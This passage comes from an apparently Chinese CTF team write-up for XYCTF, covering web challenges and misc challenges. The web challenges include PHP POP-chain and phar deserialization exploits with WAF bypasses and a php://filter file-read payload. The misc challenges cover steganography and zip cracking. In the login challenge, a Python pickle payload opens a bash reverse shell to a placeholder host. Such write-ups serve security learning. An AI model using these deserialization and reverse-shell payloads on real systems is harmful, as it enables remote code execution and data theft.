class="line"></span><br><span class="line"><span class="keyword">if</span> (isset(<span class="variable">$_POST</span>[<span class="string">&#x27;pop&#x27;</span>])) &#123;</span><br><span class="line">    unserialize(<span class="variable">$_POST</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//E--&gt;D--&gt;B--&gt;A--&gt;C</span><br><span class="line"><span class="variable">$a</span>=new E();</span><br><span class="line"><span class="variable">$b</span>=new D();</span><br><span class="line"><span class="variable">$c</span>=new B();</span><br><span class="line"><span class="variable">$d</span>=new A();</span><br><span class="line"><span class="variable">$e</span>=new C();</span><br><span class="line"><span class="variable">$a</span>-&gt;num=<span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;name=<span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;lao=<span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;chen=null;</span><br><span class="line"><span class="variable">$c</span>-&gt;luo=<span class="variable">$d</span>;</span><br><span class="line"><span class="variable">$d</span>-&gt;mack=<span class="variable">$e</span>;</span><br><span class="line"><span class="built_in">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line">//unserialize(<span class="string">&#x27;O:1:&quot;E&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;xxxxx&quot;;s:3:&quot;num&quot;;O:1:&quot;D&quot;:2:&#123;s:3:&quot;lao&quot;;O:1:&quot;B&quot;:1:&#123;s:3:&quot;luo&quot;;O:1:&quot;A&quot;:1:&#123;s:4:&quot;mack&quot;;O:1:&quot;C&quot;:1:&#123;s:5:&quot;wang1&quot;;N;&#125;&#125;&#125;s:4:&quot;chen&quot;;N;&#125;&#125;&#x27;</span>);</span><br></pre></td></tr></table></figure><p>不知道为什么本地ide可以实现反序列化但是在部署在网站后__unserialize魔术方法就无法被触发，网上也查不到，晕……</p><p>老缠，我直接把name也改了，在wakeup里触发tostring吧</p><p><img src="https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=OGMwNjgwYjQwZjQ2MDA0ZmI4MmFkOGFiZGQ2MDFiMjJfWmJoNkZRRHBIVnFkeVhINVpsTXc3YWlMRkJKSVRMa1FfVG9rZW46U1N2OWJGQVpJb010dU54WTF6RWNqWnQwblNiXzE3MTQxODY2Mzg6MTcxNDE5MDIzOF9WNA" alt="img" /></p><p>跳转到/saber_master_saber_master.php</p><p>月批的丑态……</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">//error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">define(<span class="string">&#x27;Showmaker&#x27;</span>, <span class="string">&#x27;unknown&#x27;</span>);</span><br><span class="line">// flag.php</span><br><span class="line">class XYCTFNO1</span><br><span class="line">&#123;</span><br><span class="line">    public <span class="variable">$Liu</span>;</span><br><span class="line">    public <span class="variable">$T1ng</span>;</span><br><span class="line">    private <span class="variable">$upsw1ng</span>;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> __construct(<span class="variable">$Liu</span>, <span class="variable">$T1ng</span>, <span class="variable">$upsw1ng</span> = Showmaker)//__construct() 方法用于初始化对象的属性,在对象被创建时自动调用</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;Liu = <span class="variable">$Liu</span>;</span><br><span class="line">        <span class="variable">$this</span>-&gt;T1ng = <span class="variable">$T1ng</span>;</span><br><span class="line">        <span class="variable">$this</span>-&gt;upsw1ng = <span class="variable">$upsw1ng</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class XYCTFNO2</span><br><span class="line">&#123;</span><br><span class="line">    public <span class="variable">$crypto0</span>;</span><br><span class="line">    public <span class="variable">$adwa</span>;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> __construct(<span class="variable">$crypto0</span>, <span class="variable">$adwa</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;crypto0 = <span class="variable">$crypto0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">XYCTF</span></span>()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$this</span>-&gt;adwa-&gt;crypto0 != <span class="string">&#x27;dev1l&#x27;</span> or <span class="variable">$this</span>-&gt;adwa-&gt;T1ng != <span class="string">&#x27;yuroandCMD258&#x27;</span>) &#123;</span><br><span class="line">            <span class="built_in">return</span> False;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">return</span> True;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class XYCTFNO3</span><br><span class="line">&#123;</span><br><span class="line">    public <span class="variable">$KickyMu</span>;</span><br><span class="line">    public <span class="variable">$fpclose</span>;</span><br><span class="line">    public <span class="variable">$N1ght</span> = <span class="string">&quot;Crypto0&quot;</span>;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> __construct(<span class="variable">$KickyMu</span>, <span class="variable">$fpclose</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;KickyMu = <span class="variable">$KickyMu</span>;</span><br><span class="line">        <span class="variable">$this</span>-&gt;fpclose = <span class="variable">$fpclose</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">XY</span></span>()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$this</span>-&gt;N1ght == <span class="string">&#x27;oSthing&#x27;</span>) &#123;</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">&quot;WOW, You web is really good!!!\n&quot;</span>;</span><br><span class="line">            <span class="built_in">echo</span> new <span class="variable">$_POST</span>[<span class="string">&#x27;X&#x27;</span>](<span class="variable">$_POST</span>[<span class="string">&#x27;Y&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">__wakeup</span></span>()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$this</span>-&gt;KickyMu-&gt;XYCTF()) &#123;</span><br><span class="line">            <span class="variable">$this</span>-&gt;XY();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (isset(<span class="variable">$_GET</span>[<span class="string">&#x27;CTF&#x27;</span>])) &#123;</span><br><span class="line">    unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;CTF&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">////03--&gt;02--&gt;01</span><br><span class="line"><span class="variable">$XYCTF01</span>=new XYCTFNO1(<span class="string">&#x27;dev1l&#x27;</span>, <span class="string">&#x27;yuroandCMD258&#x27;</span>);</span><br><span class="line"><span class="variable">$XYCTF01</span>-&gt;crypto0=<span class="string">&quot;dev1l&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$XYCTF02</span>=new XYCTFNO2(<span class="variable">$XYCTF01</span>,<span class="string">&quot;adwa&quot;</span>);</span><br><span class="line"><span class="variable">$XYCTF02</span>-&gt;adwa=<span class="variable">$XYCTF01</span>;</span><br><span class="line"><span class="variable">$a</span>=new XYCTFNO3(<span class="variable">$XYCTF02</span>, <span class="string">&quot;useless&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>-&gt;N1ght=<span class="string">&quot;oSthing&quot;</span>;</span><br><span class="line"><span class="built_in">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line">unserialize(serialize(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p>payload如下：?CTF=O:8:“XYCTFNO3”:3:{s:7:“KickyMu”;O:8:“XYCTFNO2”:2:{s:7:“crypto0”;O:8:“XYCTFNO1”:4:{s:3:“Liu”;s:5:“dev1l”;s:4:“T1ng”;s:13:“yuroandCMD258”;s:17:&quot; XYCTFNO1 upsw1ng&quot;;s:7:“unknown”;s:7:“crypto0”;s:5:“dev1l”;}s:4:“adwa”;r:3;}s:7:“fpclose”;s:7:“useless”;s:5:“N1ght”;s:7:“oSthing”;}</p><p>X=SplFileObject&amp;Y=php://filter/read=convert.base64-encode/resource=/flag.sh</p><p><img src="https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=NmI4YTg1OTE4MTU0NDFjNTNmZTQyOWYzNTM3NTU0ZTdfOEN2b095bGI5bXZ4OWpUUko5dTNVcm4wOW95Y05aZ2pfVG9rZW46TEVyeWJZUWFrb3NiSVF4aXpBRGNKN0JubndUXzE3MTQxODY2Mzg6MTcxNDE5MDIzOF9WNA" alt="img" /></p><p><img src="https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=NmE0NGVlZmE1YTBmMDNkMjA5NTViZTM1ZTlkNjM0OTFfb0w0bkRiUlVXQXV0YjBWT0xGNW90OWlqMEJnZUQwYjhfVG9rZW46SHpOcGJZa0tFb1RCRVN4SGFzYmNPdlpkbk52XzE3MTQxODY2Mzg6MTcxNDE5MDIzOF9WNA" alt="img" /></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Get the user</span></span><br><span class="line">user=$(<span class="built_in">ls</span> /home)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Check the environment variables for the flag and assign to INSERT_FLAG</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$DASFLAG</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    INSERT_FLAG=<span class="string">&quot;<span class="variable">$DASFLAG</span>&quot;</span></span><br><span class="line">    <span class="built_in">export</span> DASFLAG=no_FLAG</span><br><span class="line">    DASFLAG=no_FLAG</span><br><span class="line"><span class="keyword">elif</span> [ <span class="string">&quot;<span class="variable">$FLAG</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    INSERT_FLAG=<span class="string">&quot;<span class="variable">$FLAG</span>&quot;</span></span><br><span class="line">    <span class="built_in">export</span> FLAG=no_FLAG</span><br><span class="line">    FLAG=no_FLAG</span><br><span class="line"><span class="keyword">elif</span> [ <span class="string">&quot;<span class="variable">$GZCTF_FLAG</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    INSERT_FLAG=<span class="string">&quot;<span class="variable">$GZCTF_FLAG</span>&quot;</span></span><br><span class="line">    <span class="built_in">export</span> GZCTF_FLAG=no_FLAG</span><br><span class="line">    GZCTF_FLAG=no_FLAG</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    INSERT_FLAG=<span class="string">&quot;flag&#123;TEST_Dynamic_FLAG&#125;&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å°FLA</span></span><br></pre></td></tr></table></figure><p>这玩意好像是生成flag的脚本……</p><p>其实应该爬flag.php的</p><p><img src="https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=MWExOTBlZDA2NjBhMmFiMWQyOWU4NWJjOGIzZDRiNzhfNmNGaUx3Ymt0Y0tWYjU4enkyT1lNTE9SRU5DOW0zTVlfVG9rZW46TXVDMmJ4b2tUb1VaR1R4c2hQTWNPUDU2bmxkXzE3MTQxODY2Mzg6MTcxNDE5MDIzOF9WNA" alt="img" /></p><h2 id="512-pharme"><a class="markdownIt-Anchor" href="#512-pharme"></a> 5.12 pharme</h2><p>老缠题目</p><p>查看源码可以发现class.php</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">error_reporting(0); </span><br><span class="line">highlight_file(__FILE__); </span><br><span class="line">class evil&#123; </span><br><span class="line">    public <span class="variable">$cmd</span>; </span><br><span class="line">    public <span class="variable">$a</span>; </span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">__destruct</span></span>()&#123; </span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;ch3nx1&#x27;</span> === preg_replace(<span class="string">&#x27;/;+/&#x27;</span>,<span class="string">&#x27;ch3nx1&#x27;</span>,preg_replace(<span class="string">&#x27;/[A-Za-z_\(\)]+/&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$this</span>-&gt;cmd)))&#123; </span><br><span class="line">            <span class="built_in">eval</span>(<span class="variable">$this</span>-&gt;cmd.<span class="string">&#x27;isbigvegetablechicken!&#x27;</span>); </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="built_in">echo</span> <span class="string">&#x27;nonono&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>])) </span><br><span class="line">&#123; </span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^phar:\/\//i&#x27;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>])) </span><br><span class="line">    &#123; </span><br><span class="line">        die(<span class="string">&quot;nonono&quot;</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    file_get_contents(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]); </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>思路就是上传一个phar文件，然后存在敏感函数file_get_contents，对其用phar伪协议解压时可以触发反序列化。</p><p>生成phar文件的脚本：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class evil&#123;</span><br><span class="line">    public <span class="variable">$cmd</span>;</span><br><span class="line">    public <span class="variable">$a</span>;</span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">__destruct</span></span>()&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;ch3nx1&#x27;</span> === preg_replace(<span class="string">&#x27;/;+/&#x27;</span>,<span class="string">&#x27;ch3nx1&#x27;</span>,preg_replace(<span class="string">&#x27;/[A-Za-z_\(\)]+/&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$this</span>-&gt;cmd)))&#123;</span><br><span class="line">            <span class="built_in">eval</span>(<span class="variable">$this</span>-&gt;cmd.<span class="string">&#x27;isbigvegetablechicken!&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">echo</span> (preg_replace(<span class="string">&#x27;/;+/&#x27;</span>,<span class="string">&#x27;ch3nx1&#x27;</span>,preg_replace(<span class="string">&#x27;/[A-Za-z_\(\)]+/&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$this</span>-&gt;cmd)));</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">&quot;\n&quot;</span>.<span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="built_in">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> = new Phar(<span class="string">&quot;phar.phar&quot;</span>); //后缀名必须为phar</span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); //设置stub</span><br><span class="line"><span class="variable">$o</span> = new evil();</span><br><span class="line"><span class="variable">$o</span>-&gt;cmd = <span class="string">&#x27;highlight_file(array_rand(array_flip(scandir(getcwd()))));__HALT_COMPILER();&#x27;</span>;</span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$o</span>); //将自定义的meta-data存入manifest</span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); //添加要压缩的文件</span><br><span class="line">//签名自动计算</span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>但是题目有几层waf</p><ol><li>题目过滤了.gz，.phar之类的后缀</li><li>题目过滤了文件中的__HALT_COMPILER();，这是phar文件的识别标志</li><li>POST传入file时过滤了开头为phar的字符串</li><li>evil类过滤了cmd参数，要求传入无参数命令执行，且被拼接了脏数据</li></ol><p>依次可以采取以下步骤绕过：</p><ol><li>更改后缀为.gif，因为phar文件识别只看文件中的__HALT_COMPILER();标志而不看后缀，改后缀即可上传</li><li>在linux中用gzip指令处理phar文件即可，phar伪协议也可以解压.gz文件</li><li>用其他伪协议绕过，比如compress.zlib://phar://也可以实现phar解压</li><li>构造payload<code>highlight_file(array_rand(array_flip(scandir(getcwd()))));__HALT_COMPILER();</code>。前者可以随机读取当前目录的文件，再用__HALT_COMPILER();阻止eval读入拼接的脏数据。</li></ol><p>然后一直刷新就有概率爆flag。</p><p>这题傻逼的地方在于目录底下有20多个无关文件，搞起我一直刷新刷不出flag以为是方法错了破防了。其实多刷新几次就可以爆flag。</p><p><img src="https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDVjOGEyMDc2NDc5YTU4MzI5YWZjZDQwMTFjNDJmZjdfenJkRnhWRUZFTHd1R1lrMGRIVjA4amppZkp1RlRYRkVfVG9rZW46RTQ2dWJydkp3b2lBT0x4dmJ2ZGN5RFpZbkdmXzE3MTQxODY2Mzg6MTcxNDE5MDIzOF9WNA" alt="img" /></p><h2 id="513-连连看"><a class="markdownIt-Anchor" href="#513-连连看"></a> 5.13 连连看</h2><p><a href="https://github.com/synacktiv/php_filter_chain_generator">https://github.com/synacktiv/php_filter_chain_generator</a></p><p>用里面的脚本 尾部加一个&lt;</p><p>然后再filter链的最后加多个 |string.strip_tags</p><h2 id="514-login"><a class="markdownIt-Anchor" href="#514-login"></a> 5.14 login</h2><p>打开看见一个login界面，猜测有register界面，发现真有，注册一下，登录进去，发现有一个重定向，点击后跳转到一个hello world的主界面，抓包看一下，发现cookie是base64编码，解码发现是pickle序列化的形式，应该就是pickle反序列化，经过测试一下，发现过滤了字符r，也就是不能用R指令，那我们用其他指令即可</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">op=<span class="string">&#x27;&#x27;&#x27;V__setstate__</span></span><br><span class="line"><span class="string">(S&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/X.X.X.X/port 0&gt;&amp;1&#x27;&quot;</span></span><br><span class="line"><span class="string">ios</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">.&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(op.encode()))</span><br></pre></td></tr></table></figure><p>把网页主页的cookie改为这个脚本生成的payload，再拿服务器反弹shell即可</p><p><img src="https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=M2NlNjRhZDM2ZjNlYWEzZTA4ODAwOGNmNzkzM2MyNTRfakpnRFdqMm5JWmlJRVlIT2VNb1FvWnJreDlvMkNGaUlfVG9rZW46U2xYWGJqcXQ4b1VjQWJ4WUw4amM3TUVTbnpnXzE3MTQxODY2Mzg6MTcxNDE5MDIzOF9WNA" alt="img" /></p><p><img src="https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=OGQzZGQ5NWZhYTAzMDM0MWZlZDA0OTgyY2Y5MWUwNzZfaHlVZVZsVTFNa28yT0dFaVlHQTk2Q3ZjUEMxd2dMTTBfVG9rZW46R2ZRZGJ2QmVqb3ZmVEF4Vnd0Q2NOZkVnbmtkXzE3MTQxODY2Mzg6MTcxNDE5MDIzOF9WNA" alt="img" /></p><h2 id="515-ezclass"><a class="markdownIt-Anchor" href="#515-ezclass"></a> 5.15 ezClass</h2><h2 id="516-εzмkε"><a class="markdownIt-Anchor" href="#516-εzмkε"></a> 5.16 <strong>εZ?¿м@Kε¿?</strong></h2><p>在makefile中，$&lt;可以代表一个目标规则中第一个依赖文件的名称，在这里即代表了/flag文件，用&lt;可以将文件内容重定向到标准输出，而用$()可以替换括号里面的变量值，这里的$(&lt;$&lt;),就是将/flag文件里面内容重定向到标准输出并且用$()将其替换出来</p><p><img src="https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=NzYzNjc2MjYyM2Y0MTBiZWVmZDIyYjFiZmM0MzA0NWZfeGxTY0FVQmNYVXdnNlE1d1ZEYUVSNUVqaXk4ejMwdnJfVG9rZW46R0hpVWJob3RUb25iZ3p4SEN3QWNzQVJSbndiXzE3MTQxODY2Mzg6MTcxNDE5MDIzOF9WNA" alt="img" /></p><h1 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> Misc</h1><h2 id="11-game"><a class="markdownIt-Anchor" href="#11-game"></a> 1.1 game</h2><p><img src="https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=OWYxMjI1YWExMDNhZTQ3MjdmNzdjMDhlOTg0NGQ4MzJfdThSbUFFcUNQOUM5ZERxZ0lraU9yNDdtV0VoaHhLcXlfVG9rZW46Vk0zeGJaVzY3bzBQTW94R0xDOWNzR3Vmbk1iXzE3MTQxODcwOTk6MTcxNDE5MDY5OV9WNA" alt="img" /></p><p>谷歌识图就出了</p><h2 id="12-熊博士"><a class="markdownIt-Anchor" href="#12-熊博士"></a> 1.2 熊博士</h2><p><img src="https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=OWM2YTNjMjA3MTgxYzQwMjM5NTkxMmZjNjhiN2IzODNfZDZVY3RvNGo5WXNod3pNMGJoNVZyMUtYVXpxOG92WXNfVG9rZW46QUl0bmJjR01Ub0ZCOUl4VDNNa2NYWlNCbmJmXzE3MTQxODcwOTk6MTcxNDE5MDY5OV9WNA" alt="img" /></p><p>熊博士即熊斐特的埃特巴什码</p><h2 id="13-彩蛋"><a class="markdownIt-Anchor" href="#13-彩蛋"></a> 1.3 彩蛋</h2><p>在比赛须知页面130131103124106173164150151163137141137</p><p>三个一组八进制转</p><p><img src="https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=MzdlZjQxNGIxMWRmZWVjZjU0YTgwOGViN2JjNjU3YTRfMkpIUE1xYmU2WFlTSXYxbU14S3FiZDN4dkRIUlFWS2NfVG9rZW46U3B1VGI5VnRtb3ltMTh4ZHF3VWNkeTdqbkNkXzE3MTQxODcwOTk6MTcxNDE5MDY5OV9WNA" alt="img" /></p><p>在footer11001101101001110111011001001011111110100111101001111101</p><p>6个一组二进制转</p><p><img src="https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=MWQ1NmZmNmQ4MTczNmY3OTJmYzdjNjU1ZjJkMDYyMDNfaWNnMGRxSmFCTkZYNUEzV2RQMDhXaDlHWnY0OW5NWE5fVG9rZW46QWd0RWJjdHRJb0ZMVnR4QVBHcGNFeUx1bmxjXzE3MTQxODcwOTk6MTcxNDE5MDY5OV9WNA" alt="img" /></p><p>保存全站唯一一张图片，poster，到网站里改个格式，改为png，放到zsteg里面解析(LSB也可以)，发现keyboard：</p><p>xn0jtxgoy.p{urp{lbi{abe{c{ydcbt{frb{jab{</p><p>丢随波逐流里面解一下</p><p>bl0ckbuster_for_png_and_i_think_yon_can</p><p>XYCTF{this_a_bl0ckbuster_for_png_and_i_think_yon_can_find_it}</p><p>真能藏</p><h2 id="14-zzl的护理小课堂"><a class="markdownIt-Anchor" href="#14-zzl的护理小课堂"></a> 1.4 zzl的护理小课堂</h2><p><img src="https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=YTY3NWZiYWIxNzU0NGNmOWQyZjNmNTZlYTEzZDI0YTFfcDhEekhyMExuazNEQ3hEVFA1eWJrbDFGT1Bjc3pHelFfVG9rZW46VTZGU2JDM0RYb1pCZ2Z4VTN5OGNrSnhjbnVoXzE3MTQxODcwOTk6MTcxNDE5MDY5OV9WNA" alt="img" /></p><p>直接在控制台里把发送flag的函数扔进去就行</p><h2 id="15-ez_隐写"><a class="markdownIt-Anchor" href="#15-ez_隐写"></a> 1.5 ez_隐写</h2><p><img src="https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=MmVhNTRlYzEyNmM2MzRiNjg3NmIxNTI1ZDFmMTUzZWRfYnlnYkZ1MkVjOGRxTGtyeEVIMlhvamNkNDB1S1lxVWpfVG9rZW46RzIwaWIxUzAxb1FtNEV4QmNBcWM1QXpCbmpkXzE3MTQxODcwOTk6MTcxNDE5MDY5OV9WNA" alt="img" /></p><p>伪加密的zip，但是修改标志区后用winrar也打不开，用7z打开了</p><p>hint图片打不开，另一个压缩包是真加密</p><p>怀疑图片宽高有问题，爆破一下crc，得到真正的宽高是5120x2880，修改后打开得到</p><p><img src="https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=M2I0ZTFkMzEwZTY5MjMwMzM4Mzg0MjRiNGEyNjkyN2VfdWpEOFRYRzhkSEdzc3V1RGIyV1hmZXpob3BVNkhqZDBfVG9rZW46RThhcWJOMW52bzBFWDZ4NHllYWN4QkJkbk5lXzE3MTQxODcwOTk6MTcxNDE5MDY5OV9WNA" alt="img" /></p><p>估计是压缩包密码，20240401，得到另一张图，binwalk没有东西。推测是水印。</p><p>用blindwatermark解码，这图片也太糊了看不清flag</p><p><img src="https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=OGI4ZThmNmJkOTFmOTU3YjZhN2QwYzRlOWYzNjIzNjVfOU5uaXU0aThianNHYlJST0ZqaWdoTmFEakw1Q0htYXhfVG9rZW46RU1EUGJGRkFmb2Z0Ym94ZUdia2NjcTlLbjJkXzE3MTQxODcwOTk6MTcxNDE5MDY5OV9WNA" alt="img" /></p><p>换了个工具watermark，吾爱可以下载</p><p><img src="https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=YjZiNmVkZmU4Y2ZhZmFhN2EyZTVmNzkyNDhhMTMzZmVfU09LQWVMSHdYUTNrSVQ5empBYmhuR1JGOGY1Tk44ZzRfVG9rZW46TjJ4SmI4YWtDb2VCTGR4WmFnZ2NEVUFNbjFkXzE3MTQxODcwOTk6MTcxNDE5MDY5OV9WNA" alt="img" /></p><h2 id="16-zip神之套"><a class="markdownIt-Anchor" href="#16-zip神之套"></a> 1.6 zip神之套</h2><p>第一层</p><p><img src="https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=YTZkNjUzZWI1ZjU0OWFhYmFjM2VhZDI3NWNiNDk0MjJfaXpzeGttTGNuTXYxWUJFeUNJM2g4YTdoRWJCdlB5ajJfVG9rZW46WW9SYWJIWG9Jb2JLVnp4a2tZbWNRY29LbktmXzE3MTQxODcwOTk6MTcxNDE5MDY5OV9WNA" alt="img" /></p><p><img src="https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=NTI5NjJhOGQ4YTFiYmY0MTY5MWFjYWY1NGQxMzAxM2JfRDBsYXFrVVZ1dElBdG9IOE5IbzFkRENOTVo3Z2xtNzJfVG9rZW46SWJuc2I2MHJZb21SV3l4ejlUM2N1Y0FybmNlXzE3MTQxODcwOTk6MTcxNDE5MDY5OV9WNA" alt="img" /></p><p>第二层压缩密码需要爆破，掩码应该长这样，apchr爆破得到xyctf20240401ftcyx</p><p>第二层</p><p><img src="https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=NDk3ZTc5ZTcxZGJjY2RmMDlhMDdjNTc2NjFkZTRkOGVfWXpyUllWU1NOcm1hNUdkT204SkljMWxUSHlDTFBUMFJfVG9rZW46QzRFU2JOVlpzbzJGWEJ4U2ZlTmNLanJIbmFjXzE3MTQxODcwOTk6MTcxNDE5MDY5OV9WNA" alt="img" /></p><p>套.zip</p><p><img src="https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=MDUwNjRmNGNmNDI3NTVmNmNlM2RlYTM3ZWJkOTY1MGRfSXdlOTF3dnhadnZEQ2UxMmtMOEZnMWdaVEdvWEZTMUpfVG9rZW46U0lKY2JYQm1vb3FYa1h4U0VvR2NZSThCbkxiXzE3MTQxODcwOTk6MTcxNDE5MDY5OV9WNA" alt="img" /></p><p>flag.zip</p><p><img src="https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=N2ExODU5YmYwNDg0YmM4MzVhZjgyODY2ZmY3MGU4NTVfRlFtVUN4djhXMWJQYXJBVUJJV1J2a0tVZUpoc0RLTEdfVG9rZW46WjBIbmJaOG5Ib1JVYXJ4ZVhSZmNmNnFKbnVkXzE3MTQxODcwOTk6MTcxNDE5MDY5OV9WNA" alt="img" /></p><p>除了一个md文件，其他一毛一样，所以用，明文碰撞解密</p><p><img src="https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=NmM5NzMzMzdjMjYzZDEzMmUzNjQ5MzVmMWE4NDZiMjRfeGVWZDdObGNQQ29qcUNHNVJncVVqWTJBN3hiZTlZSDZfVG9rZW46Q3JOY2JDeHN6bzBEeDl4NE12SGN3VGZvbjdmXzE3MTQxODcwOTk6MTcxNDE5MDY5OV9WNA" alt="img" /></p><p><img 